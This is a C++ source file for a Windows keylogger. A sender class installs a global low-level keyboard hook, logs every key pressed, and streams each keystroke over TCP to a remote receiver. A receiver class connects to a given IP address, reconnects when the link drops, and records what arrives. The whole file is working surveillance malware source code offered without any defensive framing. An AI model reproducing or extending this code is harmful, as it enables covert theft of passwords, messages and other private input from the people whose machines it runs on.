#include "keylogger.h"
#include <iostream>
#include <filesystem>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <thread>
#include <chrono>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

// Static members initialization
KeyloggerSender *KeyloggerSender::instance = nullptr;
HHOOK KeyloggerSender::keyboardHook = nullptr;

// KeyloggerSender Implementation
KeyloggerSender::KeyloggerSender(ThreadManager &threadMgr)
		: running(false), threadManager(threadMgr), keyloggerSocket(INVALID_SOCKET),
			serverSocket(INVALID_SOCKET), logPath("./server")
{
	std::filesystem::create_directories(logPath);
	logger = std::make_unique<Logger>((logPath / "keys_sent.log").string());
}

KeyloggerSender::~KeyloggerSender()
{
	stop();
}

bool KeyloggerSender::start()
{
	if (running)
	{
		return true;
	}

	if (!logger->is_open())
	{
		return false;
	}

	// Initialize server socket first (non-blocking setup)
	if (!initializeServerSocket())
	{
		logger->log("ERROR", "Failed to initialize keylogger server socket");
		return false;
	}

	instance = this;
	running = true;

	// Start threads - accept() will be called in networkServerHandler thread
	threadManager.startNamedThread("KeystrokeDetection", [this]()
																 { keystrokeDetectionHandler(); }, ThreadCategory::DATA);

	threadManager.startNamedThread("KeyloggerNetworkServer", [this]()
																 { networkServerHandler(); }, ThreadCategory::NETWORK);

	logger->log("INFO", "KeyloggerSender started on port " + std::to_string(KEYLOGGER_PORT));
	return true;
}

void KeyloggerSender::stop()
{
	if (!running)
	{
		return;
	}

	running = false;
	instance = nullptr;

	cleanupKeyboardHook();
	cleanupSockets();

	threadManager.stopNamedThread("KeystrokeDetection");
	threadManager.stopNamedThread("KeyloggerNetworkServer");

	if (logger)
	{
		logger->log("INFO", "KeyloggerSender stopped");
	}
}

void KeyloggerSender::keystrokeDetectionHandler()
{
	setupKeyboardHook();

	MSG msg;
	while (running && GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

void KeyloggerSender::networkServerHandler()
{
	// Wait for client connection (this is where accept() happens - in background thread)
	if (!waitForClientConnection())
	{
		logger->log("ERROR", "Failed to accept client connection");
		return;
	}

	logger->log("INFO", "Client connected to keylogger server");

	// Main network loop - keep connection alive and listen for disconnect
	while (running && keyloggerSocket != INVALID_SOCKET)
	{
		char buffer[1];
		int result = recv(keyloggerSocket, buffer, sizeof(buffer), 0);
		if (result <= 0)
		{
			logger->log("INFO", "KeyloggerReceiver disconnected");
			break;
		}

		std::this_thread::sleep_for(std::chrono::milliseconds(THREAD_SLEEP_MS));
	}

	// Cleanup when connection lost
	std::lock_guard<std::mutex> lock(connectionMutex);
	if (keyloggerSocket != INVALID_SOCKET)
	{
		closesocket(keyloggerSocket);
		keyloggerSocket = INVALID_SOCKET;
	}
}

bool KeyloggerSender::initializeServerSocket()
{
	WSADATA wsa;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		logger->log("ERROR", "WSAStartup failed");
		return false;
	}

	serverSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (serverSocket == INVALID_SOCKET)
	{
		logger->log("ERROR", "Failed to create keylogger server socket");
		return false;
	}

	// Set socket options for better reusability (like livestream)
	int reuse = 1;
	if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&reuse, sizeof(reuse)) == SOCKET_ERROR)
	{
		logger->log("WARNING", "Failed to set SO_REUSEADDR");
	}

	sockaddr_in serverAddr = {};
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(KEYLOGGER_PORT);
	serverAddr.sin_addr.s_addr = INADDR_ANY;

	if (bind(serverSocket, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
	{
		logger->log("ERROR", "Failed to bind keylogger server socket");
		closesocket(serverSocket);
		serverSocket = INVALID_SOCKET;
		return false;
	}

	if (listen(serverSocket, 1) == SOCKET_ERROR)
	{
		logger->log("ERROR", "Failed to listen on keylogger server socket");
		closesocket(serverSocket);
		serverSocket = INVALID_SOCKET;
		return false;
	}

	logger->log("INFO", "Keylogger server socket ready on port " + std::to_string(KEYLOGGER_PORT));
	return true;
}

bool KeyloggerSender::waitForClientConnection()
{
	if (serverSocket == INVALID_SOCKET)
	{
		logger->log("ERROR", "Server socket not initialized");
		return false;
	}

	logger->log("INFO", "Waiting for KeyloggerReceiver connection...");

	sockaddr_in clientAddr;
	int clientAddrLen = sizeof(clientAddr);

	// This is where the blocking accept() happens - but now it's in background thread
	keyloggerSocket = accept(serverSocket, (sockaddr *)&clientAddr, &clientAddrLen);

	// Close server socket after accepting one connection (like original implementation)
	closesocket(serverSocket);
	serverSocket = INVALID_SOCKET;

	if (keyloggerSocket != INVALID_SOCKET)
	{
		logger->log("INFO", "KeyloggerReceiver connected successfully");
		return true;
	}
	else
	{
		logger->log("ERROR", "Failed to accept client connection");
		return false;
	}
}

void KeyloggerSender::cleanupSockets()
{
	std::lock_guard<std::mutex> lock(connectionMutex);

	// Close client socket
	if (keyloggerSocket != INVALID_SOCKET)
	{
		closesocket(keyloggerSocket);
		keyloggerSocket = INVALID_SOCKET;
	}

	// Close server socket
	if (serverSocket != INVALID_SOCKET)
	{
		closesocket(serverSocket);
		serverSocket = INVALID_SOCKET;
	}

	WSACleanup();
}

void KeyloggerSender::setupKeyboardHook()
{
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc,
																	GetModuleHandle(nullptr), 0);

	if (!keyboardHook)
	{
		logger->log("ERROR", "Failed to setup keyboard hook");
	}
	else
	{
		logger->log("INFO", "Keyboard hook setup successfully");
	}
}

void KeyloggerSender::cleanupKeyboardHook()
{
	if (keyboardHook)
	{
		UnhookWindowsHookEx(keyboardHook);
		keyboardHook = nullptr;
	}
}

void KeyloggerSender::processKeystroke(DWORD vkCode, bool isKeyDown)
{
	if (!isKeyDown)
	{
		return;
	}

	std::string keystroke = resolveVirtualKey(vkCode);
	logger->log("KEYSTROKE", keystroke);
	sendKeystrokeToClient(keystroke);
}

void KeyloggerSender::sendKeystrokeToClient(const std::string &keystroke)
{
	std::lock_guard<std::mutex> lock(connectionMutex);

	if (keyloggerSocket != INVALID_SOCKET)
	{
		std::string message = keystroke + "\n";
		int bytesSent = send(keyloggerSocket, message.c_str(), static_cast<int>(message.length()), 0);

		if (bytesSent == SOCKET_ERROR)
		{
			logger->log("ERROR", "Failed to send keystroke to client");
			closesocket(keyloggerSocket);
			keyloggerSocket = INVALID_SOCKET;
		}
	}
}

std::string KeyloggerSender::resolveVirtualKey(DWORD vkCode)
{
	switch (vkCode)
	{
	case VK_RETURN:
		return "[ENTER]";
	case VK_BACK:
		return "[BACKSPACE]";
	case VK_TAB:
		return "[TAB]";
	case VK_SHIFT:
	case VK_LSHIFT:
	case VK_RSHIFT:
		return "[SHIFT]";
	case VK_CONTROL:
	case VK_LCONTROL:
	case VK_RCONTROL:
		return "[CTRL]";
	case VK_MENU:
	case VK_LMENU:
	case VK_RMENU:
		return "[ALT]";
	case VK_ESCAPE:
		return "[ESC]";
	case VK_SPACE:
		return "[SPACE]";
	case VK_LEFT:
		return "[LEFT]";
	case VK_RIGHT:
		return "[RIGHT]";
	case VK_UP:
		return "[UP]";
	case VK_DOWN:
		return "[DOWN]";
	case VK_DELETE:
		return "[DEL]";
	case VK_CAPITAL:
		return "[CAPSLOCK]";
	case VK_INSERT:
		return "[INSERT]";
	case VK_HOME:
		return "[HOME]";
	case VK_END:
		return "[END]";
	case VK_PRIOR:
		return "[PAGEUP]";
	case VK_NEXT:
		return "[PAGEDOWN]";
	case VK_OEM_1:
		return "[;]";
	case VK_OEM_PLUS:
		return "[=]";
	case VK_OEM_COMMA:
		return "[,]";
	case VK_OEM_MINUS:
		return "[-]";
	case VK_OEM_PERIOD:
		return "[.]";
	case VK_OEM_2:
		return "[/]";
	case VK_OEM_3:
		return "[`]";
	case VK_OEM_4:
		return "[[]";
	case VK_OEM_5:
		return "[\\]";
	case VK_OEM_6:
		return "[]]";
	case VK_OEM_7:
		return "[']";
	default:
		if ((vkCode >= 0x30 && vkCode <= 0x39))
		{
			// Numbers (0-9)
			return "[" + std::string(1, static_cast<char>(vkCode)) + "]";
		}
		else if ((vkCode >= 0x41 && vkCode <= 0x5A))
		{
			// Letters (A-Z)
			return "[" + std::string(1, static_cast<char>(vkCode)) + "]";
		}
		else
		{
			return "[UNK:" + std::to_string(vkCode) + "]";
		}
	}
}

LRESULT CALLBACK KeyloggerSender::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && instance && instance->running)
	{
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			KBDLLHOOKSTRUCT *kbd = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
			instance->processKeystroke(kbd->vkCode, true);
		}
	}

	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// KeyloggerReceiver Implementation
KeyloggerReceiver::KeyloggerReceiver(ThreadManager &threadMgr)
		: running(false), threadManager(threadMgr), keyloggerSocket(INVALID_SOCKET), logPath("./client")
{
	std::filesystem::create_directories(logPath);
	logger = std::make_unique<Logger>((logPath / "keys.log").string());
}

KeyloggerReceiver::~KeyloggerReceiver()
{
	stop();
}

bool KeyloggerReceiver::start(const std::string &serverIP)
{
	if (running)
	{
		return true;
	}

	if (!logger->is_open())
	{
		return false;
	}

	this->serverIP = serverIP;
	running = true;

	threadManager.startNamedThread("KeystrokeReceiver", [this]()
																 { keystrokeReceiveHandler(); }, ThreadCategory::DATA);

	logger->log("INFO", "KeyloggerReceiver started, connecting to " + serverIP);
	return true;
}

void KeyloggerReceiver::stop()
{
	if (!running)
	{
		return;
	}

	running = false;
	cleanupSocket();

	threadManager.stopNamedThread("KeystrokeReceiver");

	if (logger)
	{
		logger->log("INFO", "KeyloggerReceiver stopped");
	}
}

void KeyloggerReceiver::keystrokeReceiveHandler()
{
	while (running)
	{
		if (connectToServer())
		{
			logger->log("INFO", "Connected to keylogger server");
			receiveAndLogKeystrokes();
		}
		else
		{
			logger->log("ERROR", "Failed to connect to keylogger server, retrying...");
		}

		if (running)
		{
			std::this_thread::sleep_for(std::chrono::milliseconds(RETRY_DELAY_MS));
		}
	}
}

bool KeyloggerReceiver::connectToServer()
{
	cleanupSocket();

	WSADATA wsa;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		logger->log("ERROR", "WSAStartup failed");
		return false;
	}

	keyloggerSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (keyloggerSocket == INVALID_SOCKET)
	{
		logger->log("ERROR", "Failed to create client socket");
		return false;
	}

	sockaddr_in serverAddr = {};
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(KEYLOGGER_PORT);

	if (inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr) <= 0)
	{
		logger->log("ERROR", "Invalid server IP address: " + serverIP);
		closesocket(keyloggerSocket);
		keyloggerSocket = INVALID_SOCKET;
		return false;
	}

	if (connect(keyloggerSocket, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
	{
		closesocket(keyloggerSocket);
		keyloggerSocket = INVALID_SOCKET;
		return false;
	}

	return true;
}

void KeyloggerReceiver::cleanupSocket()
{
	std::lock_guard<std::mutex> lock(receiveMutex);

	if (keyloggerSocket != INVALID_SOCKET)
	{
		closesocket(keyloggerSocket);
		keyloggerSocket = INVALID_SOCKET;
	}
}

void KeyloggerReceiver::receiveAndLogKeystrokes()
{
	char buffer[1024];
	std::string partialMessage;

	while (running)
	{
		int bytesReceived = recv(keyloggerSocket, buffer, sizeof(buffer) - 1, 0);

		if (bytesReceived <= 0)
		{
			logger->log("INFO", "Server disconnected or receive error");
			break;
		}

		buffer[bytesReceived] = '\0';
		partialMessage += buffer;

		size_t pos;
		while ((pos = partialMessage.find('\n')) != std::string::npos)
		{
			std::string keystroke = partialMessage.substr(0, pos);
			partialMessage = partialMessage.substr(pos + 1);

			if (!keystroke.empty())
			{
				logger->log("RECEIVED", keystroke);
			}
		}
	}

	cleanupSocket();
}